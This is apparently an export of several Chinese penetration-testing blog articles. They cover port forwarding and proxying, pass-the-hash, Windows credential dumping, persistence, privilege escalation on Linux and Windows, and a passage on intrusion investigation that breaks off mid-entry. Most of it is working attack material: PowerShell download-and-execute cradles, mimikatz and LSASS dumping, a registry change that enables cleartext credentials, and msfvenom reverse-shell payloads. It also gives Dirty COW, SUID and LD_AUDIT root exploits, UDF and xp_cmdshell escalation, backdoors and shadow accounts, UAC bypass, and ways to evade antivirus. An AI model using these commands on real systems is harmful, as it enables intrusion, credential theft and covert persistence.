[{"title":"边界代理及端口转发","url":"/article/%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E5%8F%8A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","content":"端口转发情景：\nA：hacker\nB：靶机\nC：内网\n\n\n\n方向\n说明\n\n\n\nA - &gt;   B -&gt; C  主动连接\nB有防火墙时，需要把C端口转到B,B端口再转到A，访问A端口即可  B没有防火墙时，直接把C端口映射到B,访问B端口即可\n\n\nC -&gt;   B -&gt; A  反弹shell\nC出网时，可以主动反弹到A的端口，A监听即可     C不出网时，只能反弹到B端口，再通过lcx转发到A端口，注意端口保持相同\n\n\nlcx(神器)为什么要说是神器，因为后面frp和边界代理虽然是双向流量，但是并不能反弹shell，必须借助lcx进行端口转发。\nLCX使用\n在目标之上使用，及中间机器，用来打内网\nA：攻击机\nB：靶机\nC：内网机器\n注意：重新编译可以过特征码杀软\nmakefile+lcx.c编译：make\n\n\n\n命令\n说明\n\n\n\nlcx -tran 7788 内网ip  6379\n把C的6379转发到B的7788\n\n\nlcx -tran 7789 公网ip  7789\n端口需要设置为相同，否则msf无法上线\n\n\n\n\n\n\nlcx -slave 公网ip  443 内网ip 端口\n把C的6379转发到A的7788\n\n\nlcx  -listen 443 9005\n监听A的443出口和9005入口\n\n\nfrpfrp（稳定性强）\n只能配置入网，需要配合lcx配置出网\n将 frps 及 frps.ini 放到具有公网 IP 的机器上，作为服务端\n配置：\n默认即可\n使用：\nfrps.exe -c frps.ini\n\n将 frpc 及 frpc.ini 放到处于内网环境的机器上（被控靶机），作为客户端\n配置：\n[common]server_addr = x.x.x.x（服务器ip）server_port = 7000（默认端口） [ssh]type = tcplocal_ip = 127.0.0.1（要攻击的内网ip）local_port = 22（要攻击的内网端口）remote_port = 6000（服务端ip）\n\n使用：\nfrpc.exe reload -c frpc.ini 重新加载\n\n注意： 使用msf时，需要使用lcx将靶机（中间机）的监听端口转发到msf的监听端口，两个端口号保持一致，msf监听靶机IP和端口即可\n代理转发分类\nHTTP代理\nSOCKS代理\nTelnet代理\nSSL代理\n\n\n\n代理类型\n说明\n\n\n\n正向代理\n内向外，服务器对流量进行转发\n\n\n反向代理\n外向内请求，根据域名区分，分发到不同内部网络  对外表现为多个域名为同一个ip地址\n\n\n 代理和vpn区别\n代理：\n​    传输层，tcp、udp、http、https流量\n​    默认不包含终端\nVPN：\n​    路由层，icmp、dns、http、arp流量\n​    默认包含终端\newsockts5代理工具\n 注：需要使用lcx将靶机的监听端口转发到msf的监听端口（端口号一致）\n使用：\n无防火墙：\n配置代理：被控靶机ip:8080\n访问内网ip、端口\new -s ssocksd -l 8080\t\t# 被控靶机\n\n有防火墙：\n配置代理：公网ip:1080\n访问内网ip、端口\new -s rcsocks -e 8888 -l 1080\t\t# 公网服务器ew -s rssocks -d 公网ip -e 8888\t\t# 被控靶机\n\n\n\n代理工具使用windows：\nproxifier\n此处nmap扫描端口时不能使用ping的方式，所以需要使用Pn禁ping\nnmap -Pn -sT 1.1.1.1\nlinux：\nproxychains4-ng\n安装：apt install proxychains4-ng\n配置文件：/etc/proxychains.conf，文件末尾只配置一个有效代理\n使用：proxychains4 命令\n注意：部分软件会丢失参数，py文件最好使用python启动\n补充\ngo版本ew（免杀，可重新编译）\n\n\n\n位置\n命令\n\n\n\n公网服务器：\ngo_ew  8888 1080\n\n\n被控靶机：\ngo_ew 公网ip:8888\n\n\n","categories":["内网渗透"],"tags":["端口转发","边界代理"]},{"title":"hash传递","url":"/article/hash%E4%BC%A0%E9%80%92/","content":"IPC攻击IPC共享 管道命令 的资源，实现进程间的资源共享，可以进行命令执行\n139：文件传输（2008以后弃用）\n445：身份认证（主要）\n\n\n\n\n说明\n\n\n\nnet  use \\\\_ip\\ipc$ _pass /user:_name \n建立连接\n\n\nnet  use\n查看当前连接\n\n\n使用\n复制xxx到目标c盘www目录下：copy  xxx \\_ip\\c$\\www  常用命令 ：dir、copy、at、move、renamedir \\\\_ip\\c$  查看c盘文件  net time \\\\_ip   查看时间  copy shell.exe \\\\_ip\\c$\\   复制到c盘  at \\\\_ip 19:18:00 c:\\shell.exe   计划任务\n\n\nnet share  ipc$ /del  \n删除连接\n\n\n工具\npstools 微软官方集成的命令工具集  psexec.exe /accepteula \\\\_ip  不弹窗执行IPC命令\n\n\n哈希传递（PTH）hash加密过程：明文 -&gt; hex -&gt; unicode -&gt; md4\n身份认证过程中，没有使用明文密码验证，而是hash验证，只要获取hash值，可以直接使用hash进行身份验证。\n注意：2003和2008+的hash不同（相同明文加密方式不同，不可通用）\n哈希登录工具：\ncs、msf、impacket、mimikatz、ladon等\n使用前提：\n445处于开启状态（批量扫描445端口主机）\nimpacket（单个）：\n注：\ncs中targets中右击也是单个传递（也可多选进行传递，但是会卡死，强烈不推荐！！！）\npython版本：https://github.com/SecureAuthCorp/impacket\nwindows版本：https://github.com/maaaaz/impacket-examples-windows\n使用：\npsexec.exe _user:_pass@_ip cmd  \t# 密码登录psexec.exe -hashes _hash _user@_ip cmd  \t# hash登录注：pth（pass the hash）限制  sid  501 administrator才可以hash登录2003/xp/2008 没有kb2871997补丁 任何用户都可以进行pth最后全部使用管理员账户的hash进行传递攻击\n\nmsf psexec模块\nauxiliary/admin/smb/psexec_command\t\t# 执行单个命令的PTH模块exploit/windows/smb/psexec\t\t# 执行直接就获取到meterpreter的PTH模块exploit/windows/smb/psexec_psh\t\t# 支持对一个网段进行PTH进行验证的模块\n\n\n\nLadon\nuser.txt放用户名\npass.txt放32+32位hash\n命令\nshell c:\\windows\\Landon.exe 192.168.21.12/24 SmbHashScan\n注意：\nexe版本ladon大概率被杀软拦截，建议换成ps1的powershell版本\n（user.txt和pass.txt设置与exe相同）\nshell powershell.exe Import-Module Ladon7.ps1;Ladon smbhashscan \n","categories":["内网渗透"],"tags":["hash传递"]},{"title":"Windows密码抓取","url":"/article/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/","content":"hash获取、明文密码获取\n\n\n\n说明\n\n\n\nWindows密码文件\n位置：C:\\system32\\config\\SAM  格式：Username:RID:Lmhash:NThash  注：Lmhash被弃用     加密方法：ntlm hash  一次加密：不可逆  二次加密：可逆  涉及文件：  system、security\n\n\n本地认证流程\nwinlogon.exe -&gt; lsass.exe(存有明文密码) -&gt; 加密比对\n\n\n密码抓取\nhash：lazagne、pwdump     抓取明文：quarksPwdump、netripper        powershell脚本：（2008+）     https://github.com/samratashok/nishang  1、本地执行：  powershell.exe -exec bypass -Command &quot;Import-Module  .\\Get-PassHashes.ps1;Get-PassHashes&quot; 可以将脚本放在远程服务器端，远程执行；或保存成bat脚本执行     2、远程执行：  powershell.exe  IEX (New-Object  Net.WebClient).DownloadString(&#39;http://192.168.21.112:9000/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz  注：powershell.exe可以替换，copy powershell为自定义文件，用来替换bat中的powershell.exe，可绕火绒     powershell位置：C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe3、远程下载到本地：  powershell.exe $client = new-object System.Net.WebClient;$client.DownloadFile(&#39;http://192.168.21.112:9000/procdump64.exe&#39;, &#39;C:\\www\\procdum64.exe&#39;)     其他下载：  certutil.exe  -urlcache -split -f http://192.168.1.115/robots.txt  c:\\a.txt  certutil.exe  -urlcache -split -f http://192.168.1.115/robots.txt  delete     清理缓存     4、综合：mimikatz  内网工具  使用：  privilege::debug  //提升权限  sekurlsa::logonpasswords  //抓取密码  mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit 直接执行  常用：保存为日志文件:mimikatz.exe  &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit  &gt;&gt; log.txt      遇到杀软，可使用计划任务+bat脚本调用，多层嵌套绕过  或  reg save hklm\\sam sam.bak    导出文件及system、security  然后使用mimikatz解密 :mimikatz.exe  &quot;lsadump::sam /system:system.bak /sam:sam.bak&quot; exit     1、2012+之后不再保存明文密码，需要修改注册表  reg add  hkey_local_machine\\system\\currentcontrolset\\control\\securityproviders\\wdigest\\  /v uselogoncredential  /t reg_dword /d 1 /  2016命令为：  reg  add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v  UseLogonCredential /t REG_DWORD /d 1 /f     2、重启系统：shutdown /r  /t 0（需要重新登录系统）  3、使用procdump抓取内存数据  procdump64.exe  -accepteula -ma lsass.exe lsass.dmp  4、mimikatz获取明文信息  mimikatz.exe  &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords  full&quot; exit &gt;&gt; 1.txt 其他：msf的kiwi模块meterpreter下load kiwi具体用法自行-h\n\n\nmssql命令执行绕过360检测\n\n\n\n命令\n··\n\n\n\nexec  sp_configure &#39;show advanced options&#39;, 1;   RECONFIGURE; exec sp_configure  &#39;Ole Automation Procedures&#39;, 1;   RECONFIGURE;\n开启命令\n\n\nDeclare  @runshell INT Exec SP_OACreate &#39;wscript.shell&#39;,@runshell out Exec SP_OAMeTHOD  @runshell,&#39;run&#39;,null,&#39;ping who.xxxx.dnslog.cn&#39;;\n执行命令\n\n\n注：SP_OAMeTHOD使用vb脚本执行命令\n 文末附上乌云安全公众号的过杀软获取密码技巧，时间原因，暂未复现。先存一波：\nhttps://mp.weixin.qq.com/s/l8G5AssZBM1LcQQSDffovA\n","categories":["内网渗透"],"tags":["密码抓取"]},{"title":"权限维持","url":"/article/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","content":"Windows权限维持\n后门：绕过安全措施获取对程序或系统放弃那个文权限的方法，是一个留在目标主机上的软件，可以使攻击者随时与目标主机进行连接。\n常见后门：\n\n\n\n分类\n说明\n\n\n\nshift后门\n连按5次shift键，会以system权限启动粘滞键  粘滞键的位置：  C:\\windows\\system32\\sethc.exe     利用  用  cmd.exe或远控木马替换 windows\\system32 目录下的粘滞键sethc.exe  如果出现拒绝访问，则需要修改权限：  takeown /f c:\\windows\\system32\\sethc.exe /a /r /d y   cacls  c:\\windows\\system32\\*.* /T      防御：  1、 禁用该  sethc.exe 功能 或者在 “控制面板”中关闭“连续按5次shift键时启用粘滞键选项”  2、使用权限约束  sethc.exe，使任何人都不能访问它\n\n\n映像劫持\n在高版本的windows版本中替换的文件受到了系统的保护，所以需要进行  “映像劫持”     利用：  注册表位置：  1、在注册表的 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows  NT\\CurrentVersion\\Image File Execution Option 下添加一个项 sethc.exe  2、在新建的项中添加debugger键，键值设置为恶意程序的路径  或cmd直接添加、双击导出文件运行。    其他可以劫持的程序：  设置中心：C:\\Windows\\System32\\utilman.exe，快捷键：Windows+U  屏幕键盘：C:\\Windows\\System32\\osk.exe  放大镜：C:\\Windows\\System32\\Magnify.exe  ，快捷键：Windows+加减号\n\n\n计划任务\nwindows7-：at，打开一个后台进程  每天定时执行：  at 24:00:00 /every:M,T,W,TH,F,S,SU  &quot;c:\\\\windwos\\\\system32\\\\atd.exe&quot;  windows8+：schtasks，将定时的任务在前台执行  系统启动时运行  schtasks /create /tn &quot;chrom&quot; /tr cmd.exe  /sc minute /mo 1   每分钟执行一次cmd  命令行乱码：  chcp 936 GBK编码  chcp 65001 utf编码\n\n\n开机启动\n注册表启动项  1、 regedit打开注册表：HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run  2、 添加一个键值类型为REG_SZ  3、 在数据中填写需要运行程序的路径  4、cmd.exe  实现了开机后自启动     其他开机启动项（需要用户登录生效，退出则失效）  C:\\ProgramData\\Microsoft\\Windows\\Start  Menu\\Programs\\StartUp  C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup  \n\n\n注册服务\nsc create jihua binPath= &quot;c:\\\\msf.exe&quot; start= auto(注意=后均有空格，不可删除)  EasyServerce、nssm等工具，自动注册服务，且有守护进程\n\n\n影子账户\n影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式找不到这个用户的信息。影子账户可以获得管理员的权限，且不容易被发现     利用  1、创建一个隐藏用户  添加的test$用户在net user命令下是看不到的，但是在管理界面下可以看到  2、在注册表中打开  HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/ 选项，点击Names菜单，  可以看到计算机中所有的账户名称  注意：如果进入SAM后无法再看到里面的子选项，需要给予administrators完权控制权限，并重新进入注册表  3、将administrator用户对应的项中的F值复制到 test$ 对应项中的F值，然后保存  4、将Names中的 test$ 和 对应的 Users 中的目录进行右键导出  5、将创建的隐藏账号 test$ 删除  6、双击刚才导出的两个注册表，影子账户就创建完成了  7、查看影子账户是否创建成功，只有在注册表中才能查看该账户\n\n\nLinux权限维持\n\n\n\n方法\n说明\n\n\n\n计划任务\ncrontab -e 写入定时任务  *  * */1 * * /bin/msf\n\n\n开机启动项\ncentos中  /etc/rc.local为开机启动项  将程序放置此文件夹即可     /etc/profile为用户启动文件夹\n\n\nssh公钥\n将公钥写入/root/.ssh/authorized_keys\n\n\n第三方守护进程\nyum  install supervisor\n\n\n","categories":["内网渗透"],"tags":["权限维持"]},{"title":"Linux提权","url":"/article/Linux%E6%8F%90%E6%9D%83/","content":"基础漏洞提权、数据库提权、SUID提权\n常用命令\n\n\n\n命令\n说明\n\n\n\nuname  -a\n显示所有可用系统信息\n\n\nuname  -r\n内核版本\n\n\nuname  -m\n查看系统架构（32/64）\n\n\ncat  /proc/version\n内核信息\n\n\ncat  /etc/issue\n发行版本信息\n\n\nid\n当前用户信息\n\n\nhttps://github.com/SecWiki/Linux-kernel-exploits\n脏牛提权：\n漏洞范围：\nLinux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）\n（CVE-2016-5195 Dirty cow -&gt; centos6、Ubuntu14、16）\nC版本\nUbuntu系统会导致系统重启\n若是直接执行导致服务器无响应，需要进入/tmp下修改passwd.bak文件后缀，则可重新运行\n实战中，需要将原始备份文件（/tmp/passwd.bak）移动至/etc/passwd，其余的备份文件可删除\n编译\ngcc -pthread dirty.c -o dirty -lcrypt\n\n运行\n./dirty _passwd\n\nC++版本（解决Ubuntu系统崩溃问题）\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil./dcow -s\n\n可复刻虚拟机，然后在本地虚拟机编译g++之后再上传靶机\n用法\n\n\n\n语句\n说明\n\n\n\ngcc  exp.c -o exp\ngcc编译\n\n\n./exp\n运行\n\n\n注：需要在交互式终端运行\n其他常用脚本：\nCVE-2018-1000001(glibc)\nMysql的UDF提权\n前提：\nmysql的root账户\nmysqld以操作系统的root权限启动\nsecure_file_priv=’’\n提权过程\n同Windows的Mysql的UDF提权\n详见udf.txt\n导出路径固定/usr/lib64/mysql/plugin/x.so\nSUID提权\n作用于二进制可执行程序上，当执行这个程序时会临时切换身份为文件所有者身份\n设置方法\n权限设定方法：\n1、 字母表示法：\nchmod u+s FILE … à 添加SUID权限\nchmod u-s FILE … à 删除SUID权限\n2、数字表示法：\nchmod 4755 FILE à 添加SUID权限到二进制程序文件 ** 在普通三位数字权限之前，用4代表添加到SUID位\nchmod 0xxx FILE à 可以删除文件的SUID\n注：s表示有效的suid权限，S表示没有执行权限，suid权限无效\n提权步骤\n1、编写C文件\n#include &lt;unistd.h&gt;void main()&#123;setuid(0);setgid(0); # 两句设置以root权限运行system(&quot;su root&quot;); # 切换到root用户&#125;\n\n2、编译\ngcc demo.c -o demo\n3、添加suid权限\nchmod +s demo\n4、伪装su文件。因为 demo.c 中有“su root”这个系统命令，要让这个su命令执行的不是系统自带的su脚本\necho &quot;/bin/bash&quot; &gt; suchmod 777 su\n\n\n\n5、添加环境变量，让系统执行/tmp下的su文件\nexport PATH=/tmp:$PATH\n\n6、在普通用户下运行demo程序，切换到root账户，提权成功\n其他提权方式\n亲测可用（环境centos7）\n登录普通用户mkdir /tmp/exploit                //创建目录ln -s /bin/ping /tmp/exploit/target        //创建ping链接exec 3&lt; /tmp/exploit/target            //设置文件夹描述为3rm -rf /tmp/exploit/            //删除文件夹ls -l /proc/$$/fd/3                //复制$$值vim payload.c                //创建配置文件void __attribute__((constructor)) init()           //在配置文件加入如下的内容&#123;setuid(0);system(&quot;/bin/bash&quot;);&#125;:wqgcc -w -fPIC -shared -o /tmp/exploit payload.c    //需要安装gccls -l /tmp/exploitLD_AUDIT=&quot;$ORIGIN&quot; exec /proc/复制$$值/fd/3\n\n","categories":["内网渗透"],"tags":["提权"]},{"title":"Windows提权","url":"/article/Windows%E6%8F%90%E6%9D%83/","content":"提权方式\n1、系统漏洞提权 *\n2、数据库提权 *\n3、第三方软件提权\n4、系统配置错误提权\n脚本提权数据库提权\tmysql:mof、udf\tmssql:xp_cmdshell开机启动项提权\t用户开机启动项\t系统开机启动项bypass_uac提权\t进程注入\t内存注入\t注册表劫持\n\n\n\n用户+组\n\n\n\n\n\n\n\n\n组\nadministrators  管理员组，最高权限  任何用户加入这个组，就有管理员权限，可以开关机、远程桌面、修改配置等    users  用户组  普通账户，通过屏幕登录系统，不能远程登录     remote desktops groups  远程桌面组  远程桌面组，用户加入后，可以3389登录     电源管理、开关机、磁盘…组\n\n\n用户\nserver系统：  administrator  管理员，最高权限用户     Guest  来宾账户，默认禁用     注意：  server 2012-2019中，administrator与Guest都默认禁用  安装系统时设置激活状态账户，在机房与云服务器中，默认设置administrator为激活账户     desktop系统： windows7及以后  安装系统时，设置自定义激活账户，加入管理员组\n\n\n权限\nGuest -&gt; 普通账户 -&gt; 电源管理、计划任务… -&gt; administrator -&gt; system\nnetwork server（网络权限，低）、local server（本地权限，高）\n在服务（本地） -&gt; 属性 -&gt;登录中可更改系统账户或自定义账户，更改服务运行的权限\n提权流程\n\n\n\n获得目标机shell\n\n\n\n\n查看目标机补丁记录\nsysteminfo -&gt; 修补程序     漏洞发布时间：2019-12  操作系统发布时间：新版本不受影响  漏洞影响范围：全版本  补丁编号：KB4525235  系统安装时间：最新安装的可能包含更多补丁  补丁包：多个补丁合集，不知道具体补丁版本     注意：  vps中集成最新补丁，查看不到补丁版本，且可能无法提权\n\n\n寻找对应的EXP\n补丁与提权脚本在线转换：  http://blog.neargle.com/win-powerup-exp-index/#  (对应信息较旧)     根据补丁查找脚本：  github搜索windows-kernel  如：     https://github.com/SecWiki/windows-kernel-exploits 提权脚本*  exploit-db.com 漏洞库\n\n\n使用EXP进行提权\n注意查看脚本说明：编译、使用方法等\n\n\nmsf提权\n\n\n\n方法\n语句\n\n\n\n开启两个终端\nctrl+shift+F1~F7\n\n\n其中运行此命令\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.21.23  lport=1111 -f psh-cmd  无文件落地，直接执行  或  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.21.23  lport=1111 -f exe -o msf.exe  生成文件\n\n\n另一个进入msfconsole，开启监听(设置session)\nuse  exploit/multi/handler  set  payload windows/meterpreter/reverse_tcp  set  lhost 0.0.0.0  set  lport 1111  set exitonsession false     允许建立多个会话 run\n\n\n常用meterpreter命令\n\n\n\n命令\n说明\n\n\n\nsysteminfo\n查看系统信息\n\n\ngetuid\n查看当前权限\n\n\ngetsystem\n自动提权\n\n\nupload  x\n传文件\n\n\nshell\n切换至命令行版本\n\n\n常用msf命令\n\n\n\n命令\n说明\n\n\n\nsearch\n搜索\n\n\nuse  id\n使用脚本\n\n\nshow  options\n显示参数\n\n\nset  x\n设置参数\n\n\nrun\n启动\n\n\nsessions\n查看会话\n\n\nsessions  id\n使用session\n\n\nwindows数据库提权\n前提：获得Mysql的root权限且数据库以system权限运行\n核心：文件导出功能\n前提：（mof提权、udf提权、开机启动项提权）\n拥有mysql的root权限\nmysql以system运行\n写文件开关开启\n\n\n\n说明\n方法\n\n\n\nmof提权\nc:/windows/system32/wbem/mof  mof编程语法，可写脚本，脚本每分钟执行一次  注：windows 2003、xp可用，需要有读写权限     二进制形式读取内容，使用  select unhex(&#39;xxx&#39;) into dumpfile &#39;x/mof/x.mof&#39;语句写入  可以增加账号（每个文件只能执行一条语句）或者执行后门文件\n\n\nUDF提权\n通过自定义函数提权  使用前提、payload见udf.txt文件\n\n\n\n\n\n数据库版本\n操作系统\nudf.dll文件导出路径\n\n\n\n&lt;5.0\n所有操作系统\n导出路径随意\n\n\n&lt;=5.1\nwindows2003     windows2000\nc:\\windows\\system32\\udf.dll  c:\\winnt\\system32\\udf.dll\n\n\n&gt;5.1\n所有操作系统\nMySQL安装目录下的\\lib\\plugin\\udf.dll\n\n\n注：\n /lib/plugin目录本身是不存在的，可以利用NTFS ADS流来创建文件夹\nselect &#x27;xxx&#x27; into dumpfile &#x27;MySQL目录\\\\lib::$INDEX_ALLOCATION&#x27;;select &#x27;xxx&#x27; into dumpfile &#x27;MySQL目录\\\\lib\\\\plugin::$INDEX_ALLOCATION&#x27;;\n\n常用mysql查询语句\n\n\n\n语句\n说明\n\n\n\nselect  version();\n查看版本\n\n\nshow  variables like ‘%version_compile_os%’;\n查看位数\n\n\nselect @@datadir\n查看数据库安装路径\n\n\nshow  variables like ‘%plugin%’\n查看插件路径\n\n\nshow  variables like ‘%secure%’\n查看是否可读写文件\n\n\ncreate  FUNCTION sys_eval RETURNS string SONAME ‘x.dll’\n使用dll文件创建函数\n\n\nselect  sys_eval(‘whoami’)\n执行命令\n\n\nDROP  FUNCTION sys_eval\n删除函数\n\n\nUDF提权步骤\n\n\n\n说明\n语句\n\n\n\n查看数据库版本\nselect  version();\n\n\n查看数据库位数\nshow variables like  ‘%version_compile_os%’;\n\n\n查看安装路径\nselect @@datadir;\n\n\n查看插件路径\nshow variables like ‘%plugin%’;\n\n\n新建插件目录  （若是不存在）\nselect ‘xxx’ into dumpfile  ‘c:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION’;  select ‘xxx’  into dumpfile ‘c:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION’;\n\n\n根据数据库版本、位数选择payload\nselect unhex(‘4D5A900…00000000’) into dumpfile  ‘c:\\phpStudy\\MySQL\\lib\\plugin\\11.dll’;\n\n\n使用dll文件创建命令执行函数\nCREATE FUNCTION sys_eval RETURNS string  SONAME ‘11.dll’;\n\n\n执行命令\nselect sys_eval(‘whoami’);\n\n\nsqlmap提权\npip install pymysqlsqlmap -d mysql://root:root@x.x.x.x:3306/mysql --os-shell --batch\n\n\n\n开机启动项提权（&gt;2008）\nbat、vbs、ps1、exe脚本\n\n\n\n路径\n说明\n\n\n\n用户目录下开机启动项  C:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\\Start  Menu\\Programs\n用户目录下的开机启动项只有在该用户登录时才会启动，重启无法触发。\n\n\n系统开机启动项     C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\n开机启动\n\n\nMSSQL数据库提权\n默认xp_cmd处于关闭状态\n\n\n\n语句\n说明\n\n\n\nselect  count(*) from master.dbo.sysobjects where xtype=”x” and  name=”xp_cmdshell”\n判断是否开启xp_cmdshell\n\n\nexec  sp_configure ‘show advanced options’,1;\n允许修改高级参数\n\n\nreconfigure;\n刷新配置\n\n\nexec  sp_configure ‘xp_cmdshell’,1;\n打开xp_cmdshell拓展\n\n\nreconfigure;\n刷新配置\n\n\nsa账户、mssql以system运行\nexec  master.dbo.xp_cmdshell ‘whoami’;  或  exec  xp_cmdshell ‘whoami’;\n\n\nBypass UAC\n使用MSF绕过\n\n\n\npayload\n说明\n\n\n\nexploit/windows/local/bypassuac\nbypassuac  模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC，它将为我们生成另一个关闭UAC的shell\n\n\nexploit/windows/local/bypassuac_injection   (内存注入)\nbypassuac_injection  模块直接运行在内存的反射DLL中，不会接触目标机的硬盘，从而降低了被杀毒软件检测出来的概率\n\n\nexploit/windows/local/bypassuac_eventvwr\nbypassuac_eventvwr  模块通过在当前用户配置单元下劫持注册表中的特殊键，在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10  UAC\n\n\n使用\n\n\n\n说明\n语句\n\n\n\nbypassuac模块\nuse  exploit/windows/local/bypassuac  set payload  windows/meterpreter/reverse_tcp  set lhost _ip  set session _id  run\n\n\nRunAs 模块  (会弹窗，需要手动确定，不推荐)\nuse  exploit/windows/local/ask  set session _id  run\n\n\nCVE-2019- 1388实现bypass  UAC\n下载地址（HHUPD.EXE）     https://github.com/jas502n/CVE-2019-1388  在目标机器中双击运行，点击另存网页，打开cmd,即可获得管理员权限\n\n\n","categories":["内网渗透"],"tags":["提权"]},{"title":"入侵排查","url":"/article/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/","content":"一、Windows入侵排查排查顺序（写排查报告的顺序相同）\n\n\n\n项目\n说明\n\n\n\n事件定性\n蠕虫、黑页、webshell、挖矿…\n\n\n时间\n\n\n\n账号安全\n弱口令 、可疑、新增账号  &#9;lusrmgr.msc查看账号  隐藏、克隆账号（影子账户）  &#9;注册表查看(HKEY_LOCAL_MACHINE/SAM/SAM)  &#9;D盾查杀（针对webshell，扫描网站目录）     影子账户：  1、创建隐藏用户并加入管理员组  2、打开注册表并赋予完全控制权限  3、打开注册表HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names  将用户的键值替换为管理员的键值  4、导出添加用户的注册表键、值  5、重新导入、重新提权\n\n\n第三方服务\n火绒剑 -&gt; 服务\n\n\n文件\n文件监控  &#9;隐藏文件  D盾扫描网站木马  本地文件查杀(最后使用，会删除病毒文件，无法取证)\n\n\n端口、进程\n端口：  netstat -nao 查看网络进程、端口情况  tasklist | findstr “PID” 查看指定PID的发起程序  进程：  任务管理器     综合：  火绒剑 -&gt; 进程、网络\n\n\n开机启动\n火绒剑  包括：  1、开始-&gt;所有程序-&gt;启动  2、msconfig\n\n\n计划任务\n控制面板-&gt;系统和安全-&gt;管理工具-&gt;计划任务  at/schtasks命令(新版)     火绒剑\n\n\n日志\n事件管理器  &#9;eventvwr.msc  推荐工具：Event Log explorer中间件日志  &#9;中间件路径  网站后台日志\n\n\n工具分析\n火绒剑、D盾\n\n\n总结：Windows入侵排查较为简单，使用火绒剑、D盾足以适应绝大部分情况（将各类信息综合起来，不需要挨个寻找）。相对麻烦的位日志，需要根据安装服务的情况寻找对应日志记录。\nWindows日志常见位置：\n\n\n日志类型\n说明\n\n\n\n应用程序日志\n1、包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件  2、例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件  3、如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于问题的解决  4、日志默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx\n\n\n系统日志\n1、记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等  2、系统日志中记录的时间类型由WindowsNT/2000操作系统预先定义  3、日志默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx\n\n\n安全日志\n1、包含安全性相关的事件，如用户权限变更，登录及注销，文件及文件夹访问，打印等信息  2、日志默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx\n\n\n转发事件\n信息  信息事件指应用程序、驱动程序或服务的成功操作的事件  警告  警告事件指不是直接的、主要的，但是会导致将来发生问题的事件例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件  错误  错误事件指用户须知道的重要的问题，通常包括功能和数据的丢失例如，如果一个服务不能作为系统引导被加载，那么它将会产生一个错误事件  成功审核  成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录/注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件  失败审核  失败的审核安全访问尝试例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来  位置Win+R -&gt; &#9;eventvwr.msc\n\n\nUSB等移动介质\n相关文件记录：WinXP/Win20003：C:\\Windows\\Setupapi.logWin7及以上版本：C:\\Windows\\INF\\setupapi.dev.log\n\n\nLinux入侵排查入侵排查顺序\n\n\n\n项目\n说明\n\n\n\n账号排查\n/etc/passwd、/etc/shadow  （x、0、/bin/bash）     特权账户：awk -F: ‘$3==0{print $1}’ /etc/passwd  远程登录账号：awk ‘/$1|$6/{print $1}’ /etc/shadow  sudo权限账号：more /etc/sudoers | grep -v “^#|^$” | grep “ALL=(ALL)”        将可疑及多余的账号删除或禁用\n\n\n历史命令\n/root/.bash_history  位置  history -r 刷新缓存（可修改） cat /root/.bash_history | more   查看历史命令\n\n\n配置文件\n.bashrc(可写入任何命令，用户登录即执行)  /etc/profile 优先级大于bashrc\n\n\n网络\nnetstat –antlp | more   查看网络进程  ls -l /proc/$PID/exe 或 file /proc/$PID/exe   查看文件路径\n\n\n服务\nss -antlp 查看所有服务\n\n\n进程\n使用ps aux命令和top命令，查看是否有异常进程  使用kill –g 进程名命令结束\n\n\n开机启动项\n使用chkconfig –list(CentOS7下使用：systemctl list -unit -files)、ls /etc/init.d/命令查看开机启动项中是否有异常的启动服务  使用chkconfig 服务名 off命令关闭(CentOS7下为：systemctl disable postfix.service)\n\n\n定时任务\ncrontab -l  列出某个用户cron服务的详细内容 crontab –r  删除每个用户cron任务  crontab –e  使用编辑器编辑当前的crontab文件     注意查看：  /etc/spool/cron 、/etc/crontab、/etc/cron.d、/etc/cron.daily、cron.hourly、/cron.monthly/、cron.weekly/\n\n\n第三方软件\n软件漏洞  对软件权限做出限制\n\n\n日志排查\n/etc/log  last | sort   查看最后登录时间  /var/log/lastlog  记录系统中所有用户最后一次登录时间的日志  /var/log/wtmp  永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件  /var/log/utmp  记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息  /var/log/secure  